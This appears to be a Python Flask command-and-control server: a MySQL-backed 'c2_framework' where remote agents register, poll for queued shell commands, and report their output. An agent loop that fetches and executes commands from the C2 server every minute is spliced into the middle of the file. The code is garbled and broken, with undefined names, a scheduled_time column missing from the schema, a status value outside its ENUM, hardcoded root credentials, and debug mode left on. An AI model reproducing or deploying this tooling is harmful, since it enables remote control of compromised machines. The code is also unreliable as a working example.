from flask import Flask, request, jsonify
import mysql.connector

app = Flask(__name__)
DB_CONFIG = {
    'user': 'root',
    'password': 'toor',
    'host': 'localhost',
    'database': 'c2_framework'
}

# Initialize the database
def init_db():
    connection = mysql.connector.connect(**DB_CONFIG)
    cursor = connection.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id INT AUTO_INCREMENT PRIMARY KEY,
            agent_id VARCHAR(255) NOT NULL UNIQUE,
            last_seen TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INT AUTO_INCREMENT PRIMARY KEY,
            agent_id VARCHAR(255) NOT NULL,
            command TEXT NOT NULL,
            status ENUM('pending', 'in progress', 'completed', 'failed') DEFAULT 'pending',
            output TEXT
        )
    ''')
    connection.commit()
    connection.close()

@app.route('/register', methods=['POST'])
def register_agent():
    agent_id = request.json.get('agent_id')
    if not agent_id:
        return jsonify({'error': 'Agent ID is required'}), 400

    connection = mysql.connector.connect(**DB_CONFIG)
    cursor = connection.cursor()
    cursor.execute('''
        INSERT INTO agents (agent_id, last_seen)
        VALUES (%s, NOW())
        ON DUPLICATE KEY UPDATE last_seen = NOW()
    ''', (agent_id,))
    connection.commit()
    connection.close()

    return jsonify({'message': 'Agent registered successfully'}), 200

@app.route('/command/<agent_id>', methods=['POST'])
def send_command(agent_id):
    command = request.json.get('command')
    scheduled_time = request.json.get('scheduled_time')  # New field
    if not command:
        return jsonify({'error': 'Command is required'}), 400

    connection = mysql.connector.connect(**DB_CONFIG)
    cursor = connection.cursor()
    cursor.execute('''
        INSERT INTO commands (agent_id, command, status, scheduled_time)
        VALUES (%s, %s, 'pending', %s)
    ''', (agent_id, command, scheduled_time))
    connection.commit()
    connection.close()

    return jsonify({'message': 'Command sent successfully'}), 200

@app.route('/poll/<agent_id>', methods=['GET'])
def poll_commands(agent_id):
    connection = mysql.connector.connect(**DB_CONFIG)
    cursor = connection.cursor()
    cursor.execute('''
        SELECT id, command FROM commands WHERE agent_id = %s AND status = 'pending'
    ''', (agent_id,))
    commands = cursor.fetchall()
    connection.close()

    # Mark the commands as 'in progress'
    connection = mysql.connector.connect(**DB_CONFIG)
    cursor = connection.cursor()
    cursor.executemany('''
        UPDATE commands SET status = 'in progress' WHERE id = %s
    ''', [(cmd[0],) for cmd in commands])
    connection.commit()
    connection.close()

    return jsonify({'commands': [{'id': cmd[0], 'command': cmd[1]} for cmd in commands]}), 200


@app.route('/heartbeat/<agent_id>', methods=['POST'])
def heartbeat(agent_id):
    connection = mysql.connector.connect(**DB_CONFIG)
    cursor = connection.cursor()
    cursor.execute('''
        UPDATE agents
        SET last_seen = NOW()
        WHERE agent_id = %s
    ''', (agent_id,))
    connection.commit()
    connection.close()

    return jsonify({'message': 'Heartbeat received'}), 200


def send_heartbeat():
    response = requests.post(f"{C2_SERVER}/heartbeat/{AGENT_ID}")
    logging.info(response.json())

def main():
    register_agent()
    while True:
        send_heartbeat()  # Send heartbeat
        commands = poll_for_commands()
        for cmd in commands:
            command_id = cmd['id']
            command = cmd['command']
            output = execute_command(command)
            report_output(command_id, output)
        time.sleep(60)  # Poll every minute



@app.route('/report', methods=['POST'])
def report_output():
    command_id = request.json.get('command_id')
    output = request.json.get('output')
    status = request.json.get('status', 'success')
    if not command_id or output is None:
        return jsonify({'error': 'Command ID and output are required'}), 400

    connection = mysql.connector.connect(**DB_CONFIG)
    cursor = connection.cursor()
    cursor.execute('''
        UPDATE commands
        SET status = %s, output = %s
        WHERE id = %s
    ''', (status, output, command_id))
    connection.commit()
    connection.close()

    return jsonify({'message': 'Output reported successfully'}), 200

if __name__ == "__main__":
    init_db()
    app.run(debug=True)
